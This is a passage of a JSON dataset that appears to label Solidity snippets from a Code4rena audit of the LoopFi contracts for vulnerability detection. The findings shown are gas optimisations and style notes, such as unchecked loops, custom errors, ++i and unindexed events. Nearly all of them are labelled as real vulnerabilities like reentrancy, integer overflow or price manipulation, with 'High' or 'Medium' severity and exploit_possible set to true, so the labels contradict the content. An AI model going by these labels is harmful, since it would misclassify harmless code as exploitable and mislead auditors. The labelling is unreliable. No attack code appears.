_calcBaseInterestAccrued(timestampLU); // U:[LP-17]\n\n647:         uint256 expectedLiquidity_ = (expectedLiquidity().toInt256() + expectedLiquidityDelta).toUint256();\n\n648:         uint256 availableLiquidity_ = (availableLiquidity().toInt256() + availableLiquidityDelta).toUint256();\n\n652:             _baseInterestIndexLU = _calcBaseInterestIndex(lastBaseInterestUpdate_).toUint128(); // U:[LP-18]\n\n657:             lastQuotaRevenueUpdate = uint40(block.timestamp); // U:[LP-18]\n\n660:         _expectedLiquidityLU = expectedLiquidity_.toUint128(); // U:[LP-18]\n\n667:             .toUint128(); // U:[LP-18]\n\n672:         return (_totalDebt.borrowed * baseInterestRate().calcLinearGrowth(timestamp)) / RAY;\n\n677:         return (_baseInterestIndexLU * (RAY + baseInterestRate().calcLinearGrowth(timestamp))) / RAY;\n\n696:         nonReentrant // U:[LP-2B]\n\n700:         _setQuotaRevenue(uint256(quotaRevenue().toInt256() + quotaRevenueDelta)); // U:[LP-19]\n\n710:         nonReentrant // U:[LP-2B]\n\n711:         poolQuotaKeeperOnly // U:[LP-2C]\n\n713:         _setQuotaRevenue(newQuotaRevenue); // U:[LP-20]\n\n719:         if (block.timestamp == timestampLU) return 0; // U:[LP-21]\n\n720:         return _calcQuotaRevenueAccrued(timestampLU); // U:[LP-21]\n\n729:             _expectedLiquidityLU += _calcQuotaRevenueAccrued(timestampLU).toUint128(); // U:[LP-20]\n\n730:             lastQuotaRevenueUpdate = uint40(block.timestamp); // U:[LP-20]\n\n732:         _quotaRevenue = newQuotaRevenue.toUint96(); // U:[LP-20]\n\n751:         configuratorOnly // U:[LP-2C]\n\n752:         nonZeroAddress(newInterestRateModel) // U:[LP-22A]\n\n754:         interestRateModel = newInterestRateModel; // U:[LP-22B]\n\n755:         _updateBaseInterest(0, 0, false); // U:[LP-22B]\n\n756:         emit SetInterestRateModel(newInterestRateModel); // U:[LP-22B]\n\n766:         configuratorOnly // U:[LP-2C]\n\n767:         nonZeroAddress(newPoolQuotaKeeper) // U:[LP-23A]\n\n770:             revert IncompatiblePoolQuotaKeeperException(); // U:[LP-23C]\n\n773:         poolQuotaKeeper = newPoolQuotaKeeper; // U:[LP-23D]\n\n776:         _setQuotaRevenue(newQuotaRevenue); // U:[LP-23D]\n\n778:         emit SetPoolQuotaKeeper(newPoolQuotaKeeper); // U:[LP-23D]\n\n788:         controllerOnly // U:[LP-2C]\n\n790:         _setTotalDebtLimit(newLimit); // U:[LP-24]\n\n803:         controllerOnly // U:[LP-2C]\n\n804:         nonZeroAddress(creditManager) // U:[LP-25A]\n\n808:                 revert IncompatibleCreditManagerException(); // U:[LP-25C]\n\n810:             _creditManagerSet.add(creditManager); // U:[LP-25D]\n\n811:             emit AddCreditManager(creditManager); // U:[LP-25D]\n\n813:         _creditManagerDebt[creditManager].limit = _convertToU128(newLimit); // U:[LP-25D]\n\n814:         emit SetCreditManagerDebtLimit(creditManager, newLimit); // U:[LP-25D]\n\n824:         controllerOnly // U:[LP-2C]\n\n827:             revert IncorrectParameterException(); // U:[LP-26A]\n\n831:         withdrawFee = newWithdrawFee.toUint16(); // U:[LP-26B]\n\n832:         emit SetWithdrawFee(newWithdrawFee); // U:[LP-26B]\n\n859:         _totalDebt.limit = newLimit; // U:[LP-1B,24]\n\n860:         emit SetTotalDebtLimit(limit); // U:[LP-1B,24]\n\n881:         return (amount * PERCENTAGE_FACTOR) / (PERCENTAGE_FACTOR - withdrawFee);\n\n886:         return (amount * (PERCENTAGE_FACTOR - withdrawFee)) / PERCENTAGE_FACTOR;\n\n906:         }); // U:[LP-14B,14C,14D]\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "<a name=\"GAS-9\"></a>[GAS-9] For Operations that will not overflow, you could use unchecked",
    "description": "*Instances (794)*: File: src/CDPVault.sol 4: import {AccessControl} from \"@openzeppelin/contracts/access/AccessControl.sol\"; 5: import {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\"; 6: import {SafeERC20} from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 356,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/vendor/AuraVault.sol\n\n238:         require(assets <= maxWithdraw(owner), \"ERC4626: withdraw more than max\");\n\n261:         require(shares <= maxRedeem(owner), \"ERC4626: redeem more than max\");\n\n289:         require(amountIn <= maxAmountIn, \"!Slippage\");\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Medium",
    "title": "<a name=\"GAS-10\"></a>[GAS-10] Use Custom Errors instead of Revert Strings to save Gas",
    "description": "Custom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas Additionally, custom errors can be used inside and outside of contracts (including interfaces and libraries). Source: <https://blog.soliditylang.org/2021/04/21/custom-errors/>: > Starting from [Solidity v0.8.4](https://github.com/ethereum/solidity/releases/tag/v0.8.4), there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert(\"Insufficient funds.\");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them. Consider replacing **all revert strings** with custom errors in the solution, and particularly those that have multiple occurrences:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.274,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/vendor/AuraVault.sol\n\n176:         return IPool(rewardPool).balanceOf(address(this));\n\n306:             IERC20(AURA).safeTransfer(_config.lockerRewards, IERC20(AURA).balanceOf(address(this)));\n\n317:         uint256 balReward = IPool(rewardPool).earned(address(this)) + IERC20(BAL).balanceOf(address(this));\n\n321:             : _previewMining(balReward) + IERC20(AURA).balanceOf(address(this));\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "<a name=\"GAS-11\"></a>[GAS-11] Avoid contract existence checks by using low level calls",
    "description": "Prior to 0.8.10 the compiler inserted extra code, including `EXTCODESIZE` (**100 gas**), to check for contract existence for external function calls. In more recent solidity versions, the compiler will not insert these checks if the external call has a return value. Similar behavior can be achieved in earlier versions by using low-level calls, since low level calls never check for contract existence *Instances (10)*: File: src/PoolV3.sol 203:         return IERC20(underlyingToken).balanceOf(address(this)); // U:[LP-3] [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/PoolV3.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.414,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/ChefIncentivesController.sol\n\n272:     function setBountyManager(address _bountyManager) external onlyOwner {\n\n281:     function setEligibilityMode(EligibilityModes _newVal) external onlyOwner {\n\n291:     function start() public onlyOwner {\n\n318:     function batchUpdateAllocPoint(address[] calldata _tokens, uint256[] calldata _allocPoints) external onlyOwner {\n\n342:     function setRewardsPerSecond(uint256 _rewardsPerSecond, bool _persist) external onlyOwner {\n\n430:     function recoverERC20(address tokenAddress, uint256 tokenAmount) external onlyOwner {\n\n581:     function setContractAuthorization(address _address, bool _authorize) external onlyOwner {\n\n909:     function setEndingTimeUpdateCadence(uint256 _lapse) external onlyOwner {\n\n920:     function registerRewardDeposit(uint256 _amount) external onlyOwner {\n\n966:     function pause() external onlyOwner {\n\n973:     function unpause() external onlyOwner {\n\n1005:     function setAddressWLstatus(address user, bool status) external onlyOwner {\n\n1012:     function toggleWhitelist() external onlyOwner {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "<a name=\"GAS-14\"></a>[GAS-14] Functions guaranteed to revert when called by normal users can be marked `payable`",
    "description": "If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. *Instances (41)*: File: src/CDPVault.sol 195:     function setParameter(bytes32 parameter, uint256 data) external whenNotPaused onlyRole(VAULT_CONFIG_ROLE) { 208:     function setParameter(bytes32 parameter, address data) external whenNotPaused onlyRole(VAULT_CONFIG_ROLE) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 30,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n272:                 i++;\n\n313:                 i++;\n\n372:         for (uint256 i; i < length; i++) {\n\n566:                     if (remaining == 0) i++;\n\n586:                     i++;\n\n594:                         j++;\n\n600:                         j++;\n\n630:                 i++;\n\n704:                 i--;\n\n743:                 i++;\n\n922:                 idx++;\n\n929:                 i++;\n\n949:                 i++;\n\n978:                 idx++;\n\n984:                 i++;\n\n1011:                     i++;\n\n1064:                 i++;\n\n1176:                 i++;\n\n1260:                 i++;\n\n1328:                     j++;\n\n1334:                     j++;\n\n1405:                 index++;\n\n1425:                 j--;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "Low",
    "title": "<a name=\"GAS-15\"></a>[GAS-15] `++i` costs less gas compared to `i++` or `i += 1` (same for `--i` vs `i--` or `i -= 1`)",
    "description": "Pre-increments and pre-decrements are cheaper. For a `uint256 i` variable, the following is true with the Optimizer enabled at 10k: **Increment:** - `i += 1` is the most expensive form - `i++` costs 6 gas less than `i += 1`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 50,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.767,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/vendor/AuraVault.sol\n\n352:             uint256 reduction = ((TOTAL_CLIFFS - cliff) * 5) / 2 + 700;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "High",
    "title": "<a name=\"GAS-17\"></a>[GAS-17] Use shift right/left instead of division/multiplication if possible",
    "description": "While the `DIV` / `MUL` opcode uses 5 gas, the `SHR` / `SHL` opcode only uses 3 gas. Furthermore, beware that Solidity's division operation also includes a division-by-0 prevention which is bypassed using shifting. Eventually, overflow checks are never performed for shift operations as they are done for arithmetic operations. Instead, the result is always truncated, so the calculation can be unchecked in Solidity version `0.8+` - Use `>> 1` instead of `/ 2` - Use `>> 2` instead of `/ 4` - Use `<< 3` instead of `* 8` - ...",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.119,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nThese save around **25 gas saved** per instance.\n\nThe same can be applied with decrements (which should use `break` when `i == 0`).\n\nThe risk of overflow is non-existent for `uint256`.\n\n*Instances (4)*:\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "<a name=\"GAS-18\"></a>[GAS-18] Increments/decrements can be unchecked in for-loops",
    "description": "In Solidity 0.8+, there's a default overflow check on unsigned integers. It's possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline. [ethereum/solidity#10695](https://github.com/ethereum/solidity/issues/10695) The change would be: - for (uint256 i; i < numIterations; i++) { + for (uint256 i; i < numIterations;) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.204,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n513:             uint256 lastIndex = earnings.length > 0 ? earnings.length - 1 : 0;\n\n517:             if (earnings.length > 0 && (earnings[lastIndex].unlockTime / 1 days) == currentDay + vestingDurationDays) {\n\n589:             if (i > 0) {\n\n696:         for (uint256 i = earnings.length; i > 0; ) {\n\n734:                 if (reward > 0) {\n\n1002:         if (earned > 0) {\n\n1037:         if (lockedSupplyWithMultiplier > 0) {\n\n1105:         if (userLocksLength > 0) {\n\n1233:             if (unseen > 0) {\n\n1252:             if (reward > 0) {\n\n1286:         if (penaltyAmount > 0) {\n\n1287:             if (burnAmount > 0) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "<a name=\"GAS-19\"></a>[GAS-19] Use != 0 instead of > 0 for unsigned integer comparison",
    "description": "*Instances (34)*: File: src/CDPVault.sol 376:             ((deltaDebt > 0 || deltaCollateral < 0) && !hasPermission(owner, msg.sender)) || 378:             (deltaCollateral > 0 && !hasPermission(collateralizer, msg.sender)) || 391:         if (deltaDebt > 0) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 28,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.676,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "abi.encodeWithSignature",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "High",
    "title": "Non Critical Issues",
    "description": "| |Issue|Instances| |-|:-|:-:| | [NC-1](#NC-1) | Replace `abi.encodeWithSignature` and `abi.encodeWithSelector` with `abi.encodeCall` which keeps the code typo/type safe | 9 | | [NC-2](#NC-2) | Missing checks for `address(0)` when assigning values to address state variables | 15 | | [NC-3](#NC-3) | Array indices should be referenced via `enum`s rather than via numeric literals | 17 |",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.023,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/utils/Math.sol\n\n18:     if (x >= 1 << 255) revert Math__toInt256_overflow();\n\n24:     if (x >= 1 << 64) revert Math__toUint64_overflow();\n\n165:                     switch mod(n, 2)\n\n172:                     let half := div(b, 2) // for rounding.\n\n174:                         n := div(n, 2)\n\n176:                         n := div(n, 2)\n\n187:                         if mod(n, 2) {\n\n225:             if iszero(slt(x, 135305999368893231589)) {\n\n234:         x = (x << 78) / 5 ** 18;\n\n239:         int256 k = ((x << 96) / 54916777467707473351141471128 + 2 ** 95) >> 96;\n\n240:         x = x - k * 54916777467707473351141471128;\n\n246:         int256 y = x + 1346386616545796478920950773328;\n\n247:         y = ((y * x) >> 96) + 57155421227552351082224309758442;\n\n248:         int256 p = y + x - 94201549194550492254356042504812;\n\n249:         p = ((p * y) >> 96) + 28719021644029726153956944680412240;\n\n250:         p = p * x + (4385272521454847904659076985693276 << 96);\n\n253:         int256 q = x - 2855989394907223263936484059900;\n\n254:         q = ((q * x) >> 96) + 50020603652535783019961831881945;\n\n255:         q = ((q * x) >> 96) - 533845033583426703283633433725380;\n\n256:         q = ((q * x) >> 96) + 3604857256930695427073651918091429;\n\n257:         q = ((q * x) >> 96) - 14423608567350463180887372962807573;\n\n258:         q = ((q * x) >> 96) + 26449188498355588339934803723976023;\n\n276:         r = int256((uint256(r) * 3822833074963236453042738258902158003155416615667) >> uint256(195 - k));\n\n318:         x = int256(uint256(x << uint256(t)) >> 159);\n\n322:         int256 p = x + 3273285459638523848632254066296;\n\n323:         p = ((p * x) >> 96) + 24828157081833163892658089445524;\n\n324:         p = ((p * x) >> 96) + 43456485725739037958740375743393;\n\n325:         p = ((p * x) >> 96) - 11111509109440967052023855526967;\n\n326:         p = ((p * x) >> 96) - 45023709667254063763336534515857;\n\n327:         p = ((p * x) >> 96) - 14706773417378608786704636184526;\n\n328:         p = p * x - (795164235651350426258249787498 << 96);\n\n332:         int256 q = x + 5573035233440673466300451813936;\n\n333:         q = ((q * x) >> 96) + 71694874799317883764090561454958;\n\n334:         q = ((q * x) >> 96) + 283447036172924575727196451306956;\n\n335:         q = ((q * x) >> 96) + 401686690394027663651624208769553;\n\n336:         q = ((q * x) >> 96) + 204048457590392012362485061816622;\n\n337:         q = ((q * x) >> 96) + 31853899698501571402653359427138;\n\n338:         q = ((q * x) >> 96) + 909429971244387300277376558375;\n\n356:         r *= 1677202110996718588342820967067443963516166;\n\n358:         r += 16597577552685614221487285958193947469193820559219878177908093499208371 * (159 - t);\n\n360:         r += 600920179829731861736702779321621459595472258049074101567377883020018308;\n\n362:         r >>= 174;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "High",
    "title": "<a name=\"NC-5\"></a>[NC-5] `constant`s should be defined rather than using magic numbers",
    "description": "Even [assembly](https://github.com/code-423n4/2022-05-opensea-seaport/blob/9d7ce4d08bf3c3010304a0476a785c70c0e90ae7/contracts/lib/TokenTransferrer.sol#L35-L39) can benefit from using readable constants instead of hex/numeric literals *Instances (56)*: File: src/PoolV3.sol 182:         if (ERC20(underlyingToken_).decimals() != 18) { [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/PoolV3.sol)",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 88,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n14: import {IMultiFeeDistribution, IFeeDistribution} from \"./interfaces/IMultiFeeDistribution.sol\";\n\n23: contract MultiFeeDistribution is\n\n24:     IMultiFeeDistribution,\n\n232:         if (rdntToken_ == address(0)) revert AddressZero();\n\n233:         if (lockZap_ == address(0)) revert AddressZero();\n\n234:         if (dao_ == address(0)) revert AddressZero();\n\n235:         if (priceProvider_ == address(0)) revert AddressZero();\n\n236:         if (rewardsDuration_ == uint256(0)) revert AmountZero();\n\n237:         if (rewardsLookback_ == uint256(0)) revert AmountZero();\n\n238:         if (lockDuration_ == uint256(0)) revert AmountZero();\n\n239:         if (vestDuration_ == uint256(0)) revert AmountZero();\n\n240:         if (burnRatio_ > WHOLE) revert InvalidBurn();\n\n241:         if (rewardsLookback_ > rewardsDuration_) revert InvalidLookback();\n\n269:             if (minters_[i] == address(0)) revert AddressZero();\n\n283:         if (bounty == address(0)) revert AddressZero();\n\n294:         if (rewardConverter_ == address(0)) revert AddressZero();\n\n305:         if (lockPeriod_.length != rewardMultipliers_.length) revert InvalidLockPeriod();\n\n325:         if (address(controller_) == address(0)) revert AddressZero();\n\n326:         if (address(treasury_) == address(0)) revert AddressZero();\n\n337:         if (stakingToken_ == address(0)) revert AddressZero();\n\n338:         if (stakingToken != address(0)) revert AlreadySet();\n\n348:         if (_rewardToken == address(0)) revert AddressZero();\n\n349:         if (!minters[msg.sender]) revert InsufficientPermission();\n\n350:         if (rewardData[_rewardToken].lastUpdateTime != 0) revert AlreadyAdded();\n\n366:         if (!minters[msg.sender]) revert InsufficientPermission();\n\n380:         if (!isTokenFound) revert InvalidAddress();\n\n405:         if (index >= _lockPeriod.length) revert InvalidType();\n\n453:         if (lookback == uint256(0)) revert AmountZero();\n\n454:         if (lookback > rewardsDuration) revert InvalidLookback();\n\n468:         if (_operationExpenseRatio > RATIO_DIVISOR) revert InvalidRatio();\n\n469:         if (_operationExpenseReceiver == address(0)) revert AddressZero();\n\n497:         if (!minters[msg.sender]) revert InsufficientPermission();\n\n498:         if (amount == 0) return;\n\n502:             _notifyReward(address(rdntToken), amount);\n\n539:         if (amount == 0) revert AmountZero();\n\n549:             if (bal.earned < remaining) revert InvalidEarned();\n\n555:                 if (earnedAmount == 0) continue;\n\n566:                     if (remaining == 0) i++;\n\n583:                     if (sumEarned == 0) revert InvalidEarned();\n\n620:         if (unlockTime <= block.timestamp) revert InvalidTime();\n\n679:         if (limit_ == 0) limit_ = _userLocks[address_].length;\n\n690:         if (msg.sender != _lockZap) revert InsufficientPermission();\n\n726:         if (msg.sender != rewardConverter) revert InsufficientPermission();\n\n732:                 _notifyUnseenReward(token);\n\n762:         requalifyFor(msg.sender);\n\n844:         if (msg.sender != address(bountyManager)) revert InsufficientPermission();\n\n1006:                 if (earnedAmount == 0) continue;\n\n1050:         rewardsData = new IFeeDistribution.RewardData[](rewardTokens.length);\n\n1081:         if (amount == 0) return;\n\n1083:             if (amount < IBountyManager(bountyManager).minDLPBalance()) revert InvalidAmount();\n\n1085:         if (typeIndex >= _lockPeriod.length) revert InvalidType();\n\n1107:             if (\n\n1224:         if (token == address(0)) revert AddressZero();\n\n1230:         if (periodFinish == 0) revert InvalidPeriod();\n\n1234:                 _notifyReward(token, unseen);\n\n1250:             _notifyUnseenReward(token);\n\n1282:         if (onBehalfOf != msg.sender) revert InsufficientPermission();\n\n1357:         if (isRelockAction && address_ != msg.sender && _lockZap != msg.sender) revert InsufficientPermission();\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "<a name=\"NC-6\"></a>[NC-6] Control structures do not follow the Solidity Style Guide",
    "description": "See the [control structures](https://docs.soliditylang.org/en/latest/style-guide.html#control-structures) section of the Solidity Style Guide *Instances (252)*: File: src/CDPVault.sol 125:     event ModifyPosition(address indexed position, uint256 debt, uint256 collateral, uint256 totalDebt); 126:     event ModifyCollateralAndDebt(",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 120,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/oracle/ChainlinkOracle.sol\n\n45:     function setOracles(address[] calldata _tokens, Oracle[] calldata _oracles) external onlyRole(DEFAULT_ADMIN_ROLE) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"NC-7\"></a>[NC-7] Critical Changes Should Use Two-step Procedure",
    "description": "The critical procedures should be two step process. See similar findings in previous Code4rena contests for reference: <https://code4rena.com/reports/2022-06-illuminate/#2-critical-changes-should-use-two-step-procedure> **Recommended Mitigation Steps** Lack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions. *Instances (1)*:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.172,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/ChefIncentivesController.sol\n\n20: contract ChefIncentivesController is Initializable, PausableUpgradeable, OwnableUpgradeable, RecoverERC20 {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "<a name=\"NC-9\"></a>[NC-9] Consider disabling `renounceOwnership()`",
    "description": "If the plan for your project does not include eventually giving up all ownership control, consider overwriting OpenZeppelin's `Ownable`'s `renounceOwnership()` function in order to disable it. *Instances (3)*: File: src/StakingLPEth.sol 8: contract StakingLPEth is ERC4626, Ownable, ReentrancyGuard { [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/StakingLPEth.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.169,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\n[Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/reward/ChefIncentivesController.sol)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"NC-11\"></a>[NC-11] Unused `error` definition",
    "description": "Note that there may be cases where an error superficially appears to be used, but this is only because there are multiple definitions of the error in different files. In such cases, the error definition should be moved into a separate file. The instances below are the unused definitions. *Instances (8)*: File: src/CDPVault.sol 150:     error CDPVault__modifyCollateralAndDebt_maxUtilizationRatio(); [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.114,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/ChefIncentivesController.sol\n\n69:     event ChefReserveLow(uint256 indexed _balance);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"NC-12\"></a>[NC-12] Event is never emitted",
    "description": "The following are defined but never emitted. They can be removed to make the code cleaner. *Instances (2)*: File: src/CDPVault.sol 135:     event LiquidatePosition( [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.113,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/reward/ChefIncentivesController.sol\n\n67:     event EmissionScheduleAppended(uint256[] startTimeOffsets, uint256[] rewardsPerSeconds);\n\n77:     event BatchAllocPointsUpdated(address[] _tokens, uint256[] _allocPoints);\n\n79:     event AuthorizedContractUpdated(address _contract, bool _authorized);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"NC-13\"></a>[NC-13] Event missing indexed field",
    "description": "Index event fields make the field more quickly accessible [to off-chain tools](https://ethereum.stackexchange.com/questions/40396/can-somebody-please-explain-the-concept-of-event-indexing) that parse events. This is especially useful when it comes to filtering based on an address. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Where applicable, each `event` should use three `indexed` fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three applicable fields, all of the applicable fields should be indexed. *Instances (8)*: File: src/StakingLPEth.sol 40:     event CooldownDurationUpdated(uint24 previousDuration, uint24 newDuration); [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/StakingLPEth.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.316,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
